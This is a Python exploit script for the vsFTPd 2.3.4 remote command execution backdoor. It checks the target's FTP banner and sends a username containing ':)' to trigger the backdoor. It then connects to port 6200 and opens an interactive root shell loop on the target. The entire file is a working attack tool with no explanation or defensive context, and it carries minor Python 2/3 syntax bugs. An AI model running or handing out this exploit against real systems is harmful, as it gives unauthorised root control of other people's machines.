#! /usr/bin/python

import sys, time
import socket
import signal
import threading
import argparse

###############################################################
# Author : Piyush Raj <0x48piraj>                             #
# Vuln   : vsFTPd 2.3.4 Remote Command Execution Backdoor     #
###############################################################

parser = argparse.ArgumentParser(description='vsFTPd 2.3.4 Backdoor Execution Exploit')
optional = parser._action_groups.pop() # popped opt args
required_opts = parser.add_argument_group('Required Parameters')
required_opts.add_argument("--target-ip", help= "IP Address of the vulnerable machine", required=True)
required_opts.add_argument("--target-port", help= "Port Address of the vulnerable running service", required=True)

target, port = parser.parse_args().target_ip, parser.parse_args().target_port

def trigger_backdoor():
    fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print("[*] Connecting to the target ...")
        fsocket.connect((target, int(port)))
    except Exception:
        print ('[!] Not Reachable : Target / Port')
        sys.exit(1)
    print ('[*] Connected to Port {}, looking for vsFTPd 2.3.4 ...').format(port)
    servive_banner = fsocket.recv(1024)
    if 'vsFTPd 2.3.4' in servive_banner:
    	print("[*] Target seems vulnerable!")
        fsocket.send("USER anything:)\n")
        fsocket.recv(1024)
        fsocket.send("PASS nothing\n")
        time.sleep(5)
        fsocket.close()
        print ('[*] Triggered the Backdoor, Spawning r00t shell ...')
        return
    else:
        print ("[!] {} doesn't seems exploitable.").format(servive_banner)
        sys.exit(1)

def recvshell(sock): # Thanks Defalt
    sock.settimeout(3)
    while True:
        try:
            print(sock.recv(1024).strip())
            print "(0x48piraj)$ ", # for py 3 : print("(0x48piraj)$ ", end='')
        except socket.timeout:
            pass
        except Exception:
            return

def signal_handler(signal, frame):
        hsocket.close()
        sys.exit(0)

try:
    trigger_backdoor() # trigger function
    hsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hsocket.connect((target, 6200))
    sthread = threading.Thread(target=recvshell, args=(hsocket,))
    sthread.start()
    print ('[*] Root Shell Spawned!\n')
    while True:
            command = raw_input("(0x48piraj)$ ").strip()
            if command == "exit":
                hsocket.close()
                sys.exit()
            hsocket.send(command + '\n')

except Exception:
    signal.signal(signal.SIGINT, signal_handler)

    